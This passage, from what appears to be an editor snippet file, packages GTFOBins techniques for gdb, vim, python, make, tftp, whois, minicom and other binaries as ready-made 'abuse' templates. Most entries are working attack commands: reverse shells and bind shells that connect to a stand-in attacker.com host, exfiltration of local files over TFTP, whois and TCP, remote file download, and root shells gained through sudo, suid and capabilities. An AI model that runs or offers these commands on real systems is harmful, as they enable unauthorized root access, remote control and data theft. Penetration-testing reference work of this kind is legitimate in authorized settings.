            "gdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()",
            "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
            "pty.spawn(\"/bin/sh\")' -ex quit${0}",
            "```"
        ],
        "description": "abuse gdb with reverse-shell - This requires that GDB is compiled with Python support. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
    },
    "gdb file-upload (gtfobins)": {
        "prefix": "gdb file-upload",
        "body": [
            "abuse gdb with file-upload, This requires that GDB is compiled with Python support. Serve files in the local folder running an HTTP server.",
            "",
            "```sh",
            "export LPORT=8888",
            "gdb -nx -ex 'python import sys; from os import environ as e",
            "if sys.version_info.major == 3: import http.server as s, socketserver as ss",
            "else: import SimpleHTTPServer as s, SocketServer as ss",
            "ss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit${0}",
            "```"
        ],
        "description": "abuse gdb with file-upload - This requires that GDB is compiled with Python support. Serve files in the local folder running an HTTP server."
    },
    "gdb file-download (gtfobins)": {
        "prefix": "gdb file-download",
        "body": [
            "abuse gdb with file-download, This requires that GDB is compiled with Python support. Fetch a remote file via HTTP GET request.",
            "",
            "```sh",
            "export URL=http://${2:attacker.com}/file_to_get",
            "export LFILE=${1:file_to_save}",
            "gdb -nx -ex 'python import sys; from os import environ as e",
            "if sys.version_info.major == 3: import urllib.request as r",
            "else: import urllib as r",
            "r.urlretrieve(e[\"URL\"], e[\"LFILE\"])' -ex quit${0}",
            "```"
        ],
        "description": "abuse gdb with file-download - This requires that GDB is compiled with Python support. Fetch a remote file via HTTP GET request."
    },
    "gdb file-write (gtfobins)": {
        "prefix": "gdb file-write",
        "body": [
            "abuse gdb with file-write, This requires that GDB is compiled with Python support.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "gdb -nx -ex \"dump value \\$LFILE \\\"DATA\\\"\" -ex quit${0}",
            "```"
        ],
        "description": "abuse gdb with file-write - This requires that GDB is compiled with Python support."
    },
    "gdb file-read (gtfobins)": {
        "prefix": "gdb file-read",
        "body": [
            "abuse gdb with file-read, This requires that GDB is compiled with Python support.",
            "",
            "```sh",
            "gdb -nx -ex 'python print(open(\"${1:file_to_read}\").read())' -ex quit${0}",
            "```"
        ],
        "description": "abuse gdb with file-read - This requires that GDB is compiled with Python support."
    },
    "gdb library-load (gtfobins)": {
        "prefix": "gdb library-load",
        "body": [
            "abuse gdb with library-load, This requires that GDB is compiled with Python support.",
            "",
            "```sh",
            "gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' -ex quit${0}",
            "```"
        ],
        "description": "abuse gdb with library-load - This requires that GDB is compiled with Python support."
    },
    "gdb suid (gtfobins)": {
        "prefix": "gdb suid",
        "body": [
            "abuse gdb with suid, This requires that GDB is compiled with Python support.",
            "",
            "```sh",
            "./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit${0}",
            "```"
        ],
        "description": "abuse gdb with suid - This requires that GDB is compiled with Python support."
    },
    "gdb sudo (gtfobins)": {
        "prefix": "gdb sudo",
        "body": [
            "abuse gdb with sudo",
            "",
            "```sh",
            "sudo gdb -nx -ex '!sh' -ex quit${0}",
            "```"
        ],
        "description": "abuse gdb with sudo"
    },
    "gdb capabilities (gtfobins)": {
        "prefix": "gdb capabilities",
        "body": [
            "abuse gdb with capabilities, This requires that GDB is compiled with Python support.",
            "",
            "```sh",
            "./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit${0}",
            "```"
        ],
        "description": "abuse gdb with capabilities - This requires that GDB is compiled with Python support."
    },
    "openvt sudo (gtfobins)": {
        "prefix": "openvt sudo",
        "body": [
            "abuse openvt with sudo, The command execution is blind (displayed on the virtual console), but it is possible to save the output on a temporary file.",
            "",
            "```sh",
            "COMMAND=id",
            "TF=\\$(mktemp -u)",
            "sudo openvt -- sh -c \"\\$COMMAND >\\$TF 2>&1\"",
            "cat \\$TF${0}",
            "```"
        ],
        "description": "abuse openvt with sudo - The command execution is blind (displayed on the virtual console), but it is possible to save the output on a temporary file."
    },
    "make shell (gtfobins)": {
        "prefix": "make shell",
        "body": [
            "abuse make with shell",
            "",
            "```sh",
            "COMMAND='/bin/sh'",
            "make -s --eval=\\$'x:\\n\\t-'\"\\$COMMAND\"${0}",
            "```"
        ],
        "description": "abuse make with shell"
    },
    "make file-write (gtfobins)": {
        "prefix": "make file-write",
        "body": [
            "abuse make with file-write, Requires a newer GNU `make` version.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "make -s --eval=\"\\\\$(file >\\$LFILE,DATA)\" .${0}",
            "```"
        ],
        "description": "abuse make with file-write - Requires a newer GNU `make` version."
    },
    "make suid (gtfobins)": {
        "prefix": "make suid",
        "body": [
            "abuse make with suid",
            "",
            "```sh",
            "COMMAND='/bin/sh -p'",
            "./make -s --eval=\\$'x:\\n\\t-'\"\\$COMMAND\"${0}",
            "```"
        ],
        "description": "abuse make with suid"
    },
    "make sudo (gtfobins)": {
        "prefix": "make sudo",
        "body": [
            "abuse make with sudo",
            "",
            "```sh",
            "COMMAND='/bin/sh'",
            "sudo make -s --eval=\\$'x:\\n\\t-'\"\\$COMMAND\"${0}",
            "```"
        ],
        "description": "abuse make with sudo"
    },
    "diff file-read (gtfobins)": {
        "prefix": "diff file-read",
        "body": [
            "abuse diff with file-read, This lists the content of a directory. `$TF` can be any directory, but for convenience it is better to use an empty directory to avoid noise output.",
            "",
            "```sh",
            "LFOLDER=folder_to_list",
            "TF=\\$(mktemp -d)",
            "diff --recursive \\$TF \\$LFOLDER${0}",
            "```"
        ],
        "description": "abuse diff with file-read - This lists the content of a directory. `$TF` can be any directory, but for convenience it is better to use an empty directory to avoid noise output."
    },
    "diff suid (gtfobins)": {
        "prefix": "diff suid",
        "body": [
            "abuse diff with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./diff --line-format=%L /dev/null \\$LFILE${0}",
            "```"
        ],
        "description": "abuse diff with suid"
    },
    "diff sudo (gtfobins)": {
        "prefix": "diff sudo",
        "body": [
            "abuse diff with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo diff --line-format=%L /dev/null \\$LFILE${0}",
            "```"
        ],
        "description": "abuse diff with sudo"
    },
    "pkg sudo (gtfobins)": {
        "prefix": "pkg sudo",
        "body": [
            "abuse pkg with sudo, \nIt runs commands using a specially crafted FreeBSD package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\n\nTF=$(mktemp -d)\n\necho 'id' > $TF/x.sh\n\nfpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF\n\n```\n",
            "",
            "```sh",
            "sudo pkg install -y --no-repo-update ./x-1.0.txz${0}",
            "```"
        ],
        "description": "abuse pkg with sudo - \nIt runs commands using a specially crafted FreeBSD package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\n\nTF=$(mktemp -d)\n\necho 'id' > $TF/x.sh\n\nfpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF\n\n```\n"
    },
    "minicom shell (gtfobins)": {
        "prefix": "minicom shell",
        "body": [
            "abuse minicom with shell, \nAfter the shell, exit with `Ctrl-A x`.\n",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo \"! exec /bin/sh <\\$(tty) 1>\\$(tty) 2>\\$(tty)\" >\\$TF",
            "minicom -D /dev/null -S \\$TF",
            "reset^J${0}",
            "```"
        ],
        "description": "abuse minicom with shell - \nAfter the shell, exit with `Ctrl-A x`.\n"
    },
    "minicom sudo (gtfobins)": {
        "prefix": "minicom sudo",
        "body": [
            "abuse minicom with sudo, \nStart the following command to open the TUI interface, then:\n\n1. press `Ctrl-A o` and select `Filenames and paths`;\n\n2. press `e`, type `/bin/sh`, then `Enter`;\n\n3. Press `Esc` twice;\n\n4. Press `Ctrl-A k` to drop the shell.\n\nAfter the shell, exit with `Ctrl-A x`.\n",
            "",
            "```sh",
            "sudo minicom -D /dev/null${0}",
            "```"
        ],
        "description": "abuse minicom with sudo - \nStart the following command to open the TUI interface, then:\n\n1. press `Ctrl-A o` and select `Filenames and paths`;\n\n2. press `e`, type `/bin/sh`, then `Enter`;\n\n3. Press `Esc` twice;\n\n4. Press `Ctrl-A k` to drop the shell.\n\nAfter the shell, exit with `Ctrl-A x`.\n"
    },
    "minicom suid (gtfobins)": {
        "prefix": "minicom suid",
        "body": [
            "abuse minicom with suid, \nStart the following command to open the TUI interface, then:\n\n1. press `Ctrl-A o` and select `Filenames and paths`;\n\n2. press `e`, type `/bin/sh -p`, then `Enter`;\n\n3. Press `Esc` twice;\n\n4. Press `Ctrl-A k` to drop the shell.\n\nAfter the shell, exit with `Ctrl-A x`.\n",
            "",
            "```sh",
            "./minicom -D /dev/null${0}",
            "```"
        ],
        "description": "abuse minicom with suid - \nStart the following command to open the TUI interface, then:\n\n1. press `Ctrl-A o` and select `Filenames and paths`;\n\n2. press `e`, type `/bin/sh -p`, then `Enter`;\n\n3. Press `Esc` twice;\n\n4. Press `Ctrl-A k` to drop the shell.\n\nAfter the shell, exit with `Ctrl-A x`.\n"
    },
    "ksshell file-read (gtfobins)": {
        "prefix": "ksshell file-read",
        "body": [
            "abuse ksshell with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "ksshell -i \\$LFILE${0}",
            "```"
        ],
        "description": "abuse ksshell with file-read"
    },
    "ksshell suid (gtfobins)": {
        "prefix": "ksshell suid",
        "body": [
            "abuse ksshell with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./ksshell -i \\$LFILE${0}",
            "```"
        ],
        "description": "abuse ksshell with suid"
    },
    "ksshell sudo (gtfobins)": {
        "prefix": "ksshell sudo",
        "body": [
            "abuse ksshell with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo ksshell -i \\$LFILE${0}",
            "```"
        ],
        "description": "abuse ksshell with sudo"
    },
    "ar file-read (gtfobins)": {
        "prefix": "ar file-read",
        "body": [
            "abuse ar with file-read",
            "",
            "```sh",
            "TF=\\$(mktemp -u)",
            "LFILE=${1:file_to_read}",
            "ar r \"\\$TF\" \"\\$LFILE\"",
            "cat \"\\$TF\"${0}",
            "```"
        ],
        "description": "abuse ar with file-read"
    },
    "ar suid (gtfobins)": {
        "prefix": "ar suid",
        "body": [
            "abuse ar with suid",
            "",
            "```sh",
            "TF=\\$(mktemp -u)",
            "LFILE=${1:file_to_read}",
            "./ar r \"\\$TF\" \"\\$LFILE\"",
            "cat \"\\$TF\"${0}",
            "```"
        ],
        "description": "abuse ar with suid"
    },
    "ar sudo (gtfobins)": {
        "prefix": "ar sudo",
        "body": [
            "abuse ar with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp -u)",
            "LFILE=${1:file_to_read}",
            "sudo ar r \"\\$TF\" \"\\$LFILE\"",
            "cat \"\\$TF\"${0}",
            "```"
        ],
        "description": "abuse ar with sudo"
    },
    "ss file-read (gtfobins)": {
        "prefix": "ss file-read",
        "body": [
            "abuse ss with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "ss -a -F \\$LFILE${0}",
            "```"
        ],
        "description": "abuse ss with file-read"
    },
    "ss suid (gtfobins)": {
        "prefix": "ss suid",
        "body": [
            "abuse ss with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./ss -a -F \\$LFILE${0}",
            "```"
        ],
        "description": "abuse ss with suid"
    },
    "ss sudo (gtfobins)": {
        "prefix": "ss sudo",
        "body": [
            "abuse ss with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo ss -a -F \\$LFILE${0}",
            "```"
        ],
        "description": "abuse ss with sudo"
    },
    "tftp file-upload (gtfobins)": {
        "prefix": "tftp file-upload",
        "body": [
            "abuse tftp with file-upload, Send local file to a TFTP server.",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "tftp \\$RHOST",
            "put ${1:file_to_send}${0}",
            "```"
        ],
        "description": "abuse tftp with file-upload - Send local file to a TFTP server."
    },
    "tftp file-download (gtfobins)": {
        "prefix": "tftp file-download",
        "body": [
            "abuse tftp with file-download, Fetch a remote file from a TFTP server.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "tftp \\$RHOST",
            "get file_to_get${0}",
            "```"
        ],
        "description": "abuse tftp with file-download - Fetch a remote file from a TFTP server."
    },
    "tftp suid (gtfobins)": {
        "prefix": "tftp suid",
        "body": [
            "abuse tftp with suid, Send local file to a TFTP server.",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "./tftp \\$RHOST",
            "put ${1:file_to_send}${0}",
            "```"
        ],
        "description": "abuse tftp with suid - Send local file to a TFTP server."
    },
    "tftp sudo (gtfobins)": {
        "prefix": "tftp sudo",
        "body": [
            "abuse tftp with sudo, Send local file to a TFTP server.",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "sudo tftp \\$RHOST",
            "put ${1:file_to_send}${0}",
            "```"
        ],
        "description": "abuse tftp with sudo - Send local file to a TFTP server."
    },
    "whois file-upload (gtfobins)": {
        "prefix": "whois file-upload",
        "body": [
            "abuse whois with file-upload, Send a binary file to a TCP port. Run `nc -l -p 12345 | tr -d $'\\x0d' | base64 -d > \"file_to_save\"` on the attacker box to collect the file. The file length is limited by the maximum size of arguments.",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "RPORT=${3:12345}",
            "LFILE=${1:file_to_send}",
            "whois -h \\$RHOST -p \\$RPORT \"`base64 \\$LFILE`\"${0}",
            "```"
        ],
        "description": "abuse whois with file-upload - Send a binary file to a TCP port. Run `nc -l -p 12345 | tr -d $'\\x0d' | base64 -d > \"file_to_save\"` on the attacker box to collect the file. The file length is limited by the maximum size of arguments."
    },
    "whois file-download (gtfobins)": {
        "prefix": "whois file-download",
        "body": [
            "abuse whois with file-download, Fetch remote binary file from a remote TCP port. Run `base64 \"file_to_send\" | nc -l -p 12345` on the attacker box to send the file.",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "RPORT=${3:12345}",
            "LFILE=${1:file_to_save}",
            "whois -h \\$RHOST -p \\$RPORT | base64 -d > \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse whois with file-download - Fetch remote binary file from a remote TCP port. Run `base64 \"file_to_send\" | nc -l -p 12345` on the attacker box to send the file."
    },
    "nice shell (gtfobins)": {
        "prefix": "nice shell",
        "body": [
            "abuse nice with shell",
            "",
            "```sh",
            "nice /bin/sh${0}",
            "```"
        ],
        "description": "abuse nice with shell"
    },
    "nice suid (gtfobins)": {
        "prefix": "nice suid",
        "body": [
            "abuse nice with suid",
            "",
            "```sh",
            "./nice /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse nice with suid"
    },
    "nice sudo (gtfobins)": {
        "prefix": "nice sudo",
        "body": [
            "abuse nice with sudo",
            "",
            "```sh",
            "sudo nice /bin/sh${0}",
            "```"
        ],
        "description": "abuse nice with sudo"
    },
    "vim shell (gtfobins)": {
        "prefix": "vim shell",
        "body": [
            "abuse vim with shell, This requires that `vim` is compiled with Lua support.",
            "",
            "```sh",
            "vim -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse vim with shell - This requires that `vim` is compiled with Lua support."
    },
    "vim reverse-shell (gtfobins)": {
        "prefix": "vim reverse-shell",
        "body": [
            "abuse vim with reverse-shell, This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "vim -c ':py import vim,sys,socket,os,pty;s=socket.socket()",
            "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
            "pty.spawn(\"/bin/sh\")",
            "vim.command(\":q!\")'${0}",
            "```"
        ],
        "description": "abuse vim with reverse-shell - This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
    },
    "vim non-interactive-reverse-shell (gtfobins)": {
        "prefix": "vim non-interactive-reverse-shell",
        "body": [
            "abuse vim with non-interactive-reverse-shell, Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "vim -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());",
            "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "  while true do",
            "    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));",
            "    local b=assert(f:read(\"*a\"));t:send(b);",
            "  end;",
            "  f:close();t:close();'${0}",
            "```"
        ],
        "description": "abuse vim with non-interactive-reverse-shell - Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed."
    },
    "vim non-interactive-bind-shell (gtfobins)": {
        "prefix": "vim non-interactive-bind-shell",
        "body": [
            "abuse vim with non-interactive-bind-shell, Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export LPORT=${1:12345}",
            "vim -c ':lua local k=require(\"socket\");",
            "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "  local c=s:accept();",
            "  while true do",
            "    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));",
            "    local b=assert(f:read(\"*a\"));c:send(b);",
            "  end;c:close();f:close();'${0}",
            "```"
        ],
        "description": "abuse vim with non-interactive-bind-shell - Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed."
    },
    "vim file-upload (gtfobins)": {
        "prefix": "vim file-upload",
        "body": [
            "abuse vim with file-upload, Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export RHOST=${2:attacker.com}",
            "export RPORT=${3:12345}",
            "export LFILE=${1:file_to_send}",
            "vim -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')",
            "  local d=f:read(\"*a\")",
            "  io.close(f);",
            "  local s=require(\"socket\");",
            "  local t=assert(s.tcp());",
            "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "  t:send(d);",
            "  t:close();'${0}",
            "```"
        ],
        "description": "abuse vim with file-upload - Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed."
    },
    "vim file-download (gtfobins)": {
        "prefix": "vim file-download",
        "body": [
            "abuse vim with file-download, Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export LPORT=${2:12345}",
            "export LFILE=${1:file_to_save}",
            "vim -c ':lua local k=require(\"socket\");",
            "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "  local c=s:accept();",
            "  local d,x=c:receive(\"*a\");",
            "  c:close();",
            "  local f=io.open(os.getenv(\"LFILE\"), \"wb\");",
            "  f:write(d);",
            "  io.close(f);'${0}",
            "```"
        ],
        "description": "abuse vim with file-download - Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed."
    },
    "vim file-write (gtfobins)": {
        "prefix": "vim file-write",
        "body": [
            "abuse vim with file-write",
            "",
            "```sh",
            "vim ${1:file_to_write}",
            "iDATA",
            "^[",
            "w${0}",
            "```"
        ],
        "description": "abuse vim with file-write"
    },
    "vim file-read (gtfobins)": {
        "prefix": "vim file-read",
        "body": [
            "abuse vim with file-read",
            "",
            "```sh",
            "vim ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse vim with file-read"
    },
    "vim library-load (gtfobins)": {
        "prefix": "vim library-load",
        "body": [
            "abuse vim with library-load, This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "vim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'${0}",
            "```"
        ],
        "description": "abuse vim with library-load - This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "vim suid (gtfobins)": {
        "prefix": "vim suid",
        "body": [
            "abuse vim with suid, This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'${0}",
            "```"
        ],
        "description": "abuse vim with suid - This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "vim sudo (gtfobins)": {
        "prefix": "vim sudo",
        "body": [
            "abuse vim with sudo, This requires that `vim` is compiled with Lua support.",
            "",
            "```sh",
            "sudo vim -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse vim with sudo - This requires that `vim` is compiled with Lua support."
    },
    "vim capabilities (gtfobins)": {
        "prefix": "vim capabilities",
        "body": [
            "abuse vim with capabilities, This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "./vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse vim with capabilities - This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "vim limited-suid (gtfobins)": {
        "prefix": "vim limited-suid",
        "body": [
            "abuse vim with limited-suid, This requires that `vim` is compiled with Lua support.",
            "",
            "```sh",
            "./vim -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse vim with limited-suid - This requires that `vim` is compiled with Lua support."
    },
    "base58 file-read (gtfobins)": {
        "prefix": "base58 file-read",
        "body": [
            "abuse base58 with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "base58 \"\\$LFILE\" | base58 --decode${0}",
            "```"
        ],
        "description": "abuse base58 with file-read"
    },
    "base58 sudo (gtfobins)": {
        "prefix": "base58 sudo",
        "body": [
            "abuse base58 with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo base58 \"\\$LFILE\" | base58 --decode${0}",
            "```"
        ],
        "description": "abuse base58 with sudo"
    },
    "pic file-read (gtfobins)": {
        "prefix": "pic file-read",
        "body": [
            "abuse pic with file-read, The output is prefixed with a some content as a header.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "pic \\$LFILE${0}",
            "```"
        ],
        "description": "abuse pic with file-read - The output is prefixed with a some content as a header."
    },
    "pic shell (gtfobins)": {
        "prefix": "pic shell",
        "body": [
            "abuse pic with shell",
            "",
            "```sh",
            "pic -U",
            ".PS",
            "sh X sh X${0}",
            "```"
        ],
        "description": "abuse pic with shell"
    },
    "pic sudo (gtfobins)": {
        "prefix": "pic sudo",
        "body": [
            "abuse pic with sudo",
            "",
            "```sh",
            "sudo pic -U",
            ".PS",
            "sh X sh X${0}",
            "```"
        ],
        "description": "abuse pic with sudo"
    },
    "pic limited-suid (gtfobins)": {
        "prefix": "pic limited-suid",
        "body": [
            "abuse pic with limited-suid",
            "",
            "```sh",
            "./pic -U",
            ".PS",
            "sh X sh X${0}",
            "```"
        ],
        "description": "abuse pic with limited-suid"
    },
    "python shell (gtfobins)": {
        "prefix": "python shell",
        "body": [
            "abuse python with shell",
            "",
            "```sh",
            "python -c 'import os; os.system(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse python with shell"
    },
    "python reverse-shell (gtfobins)": {
        "prefix": "python reverse-shell",
        "body": [
            "abuse python with reverse-shell, Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "python -c 'import sys,socket,os,pty;s=socket.socket()",
            "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
            "pty.spawn(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse python with reverse-shell - Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
    },
    "python file-upload (gtfobins)": {
        "prefix": "python file-upload",
        "body": [
            "abuse python with file-upload, Serve files in the local folder running an HTTP server.",
            "",
            "```sh",
            "export LPORT=8888",
            "python -c 'import sys; from os import environ as e",
            "if sys.version_info.major == 3: import http.server as s, socketserver as ss",
            "else: import SimpleHTTPServer as s, SocketServer as ss",
            "ss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()'${0}",
            "```"
        ],
        "description": "abuse python with file-upload - Serve files in the local folder running an HTTP server."
    },
    "python file-download (gtfobins)": {
        "prefix": "python file-download",
        "body": [
            "abuse python with file-download, Fetch a remote file via HTTP GET request.",
            "",
            "```sh",
            "export URL=http://${2:attacker.com}/file_to_get",
            "export LFILE=${1:file_to_save}",
            "python -c 'import sys; from os import environ as e",
            "if sys.version_info.major == 3: import urllib.request as r",
            "else: import urllib as r",
            "r.urlretrieve(e[\"URL\"], e[\"LFILE\"])'${0}",
            "```"
        ],
        "description": "abuse python with file-download - Fetch a remote file via HTTP GET request."
    },
    "python file-write (gtfobins)": {
        "prefix": "python file-write",
        "body": [
            "abuse python with file-write",
            "",
            "```sh",
            "python -c 'open(\"${1:file_to_write}\",\"w+\").write(\"DATA\")'${0}",
            "```"
        ],
        "description": "abuse python with file-write"
    },
    "python file-read (gtfobins)": {
        "prefix": "python file-read",
        "body": [
            "abuse python with file-read",
            "",
            "```sh",
            "python -c 'print(open(\"${1:file_to_read}\").read())'${0}",
            "```"
        ],
        "description": "abuse python with file-read"
    },
    "python library-load (gtfobins)": {
        "prefix": "python library-load",
        "body": [
            "abuse python with library-load",
            "",
            "```sh",
            "python -c 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'${0}",
            "```"
        ],
        "description": "abuse python with library-load"
    },
    "python suid (gtfobins)": {
        "prefix": "python suid",
        "body": [
            "abuse python with suid",
            "",
            "```sh",
            "./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'${0}",
            "```"
        ],
        "description": "abuse python with suid"
    },
    "python sudo (gtfobins)": {
        "prefix": "python sudo",
        "body": [
            "abuse python with sudo",
            "",
            "```sh",
            "sudo python -c 'import os; os.system(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse python with sudo"
    },
    "python capabilities (gtfobins)": {
        "prefix": "python capabilities",
        "body": [
            "abuse python with capabilities",
            "",
            "```sh",
            "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse python with capabilities"
    },
    "update-alternatives sudo (gtfobins)": {
        "prefix": "update-alternatives sudo",
        "body": [
            "abuse update-alternatives with sudo, Write in `$LFILE` a symlink to `$TF`.",
            "",
            "```sh",
            "LFILE=/path/to/${1:file_to_write}",
            "TF=\\$(mktemp)",
            "echo DATA >\\$TF",
            "sudo update-alternatives --force --install \"\\$LFILE\" x \"\\$TF\" 0${0}",
            "```"
        ],
        "description": "abuse update-alternatives with sudo - Write in `$LFILE` a symlink to `$TF`."
    },
    "update-alternatives suid (gtfobins)": {
        "prefix": "update-alternatives suid",
        "body": [
            "abuse update-alternatives with suid, Write in `$LFILE` a symlink to `$TF`.",
            "",
            "```sh",
            "LFILE=/path/to/${1:file_to_write}",
            "TF=\\$(mktemp)",
            "echo DATA >\\$TF",
            "./update-alternatives --force --install \"\\$LFILE\" x \"\\$TF\" 0${0}",
            "```"
        ],
        "description": "abuse update-alternatives with suid - Write in `$LFILE` a symlink to `$TF`."
    },
    "dnf sudo (gtfobins)": {
        "prefix": "dnf sudo",
        "body": [
            "abuse dnf with sudo, \nIt runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\n\nTF=$(mktemp -d)\n\necho 'id' > $TF/x.sh\n\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n\n```\n",
            "",
            "```sh",
            "sudo dnf install -y x-1.0-1.noarch.rpm${0}",
            "```"
        ],
        "description": "abuse dnf with sudo - \nIt runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\n\nTF=$(mktemp -d)\n\necho 'id' > $TF/x.sh\n\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n\n```\n"
    },
    "softlimit shell (gtfobins)": {
        "prefix": "softlimit shell",
        "body": [
            "abuse softlimit with shell",
            "",
            "```sh",
            "softlimit /bin/sh${0}",
            "```"
        ],
        "description": "abuse softlimit with shell"
    },
    "softlimit suid (gtfobins)": {
        "prefix": "softlimit suid",
        "body": [
            "abuse softlimit with suid",
            "",
            "```sh",
            "./softlimit /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse softlimit with suid"
    },
    "softlimit sudo (gtfobins)": {
        "prefix": "softlimit sudo",
        "body": [
            "abuse softlimit with sudo",
            "",
            "```sh",
            "sudo softlimit /bin/sh${0}",
            "```"
        ],
        "description": "abuse softlimit with sudo"
    },
    "ansible-test shell (gtfobins)": {
        "prefix": "ansible-test shell",
        "body": [
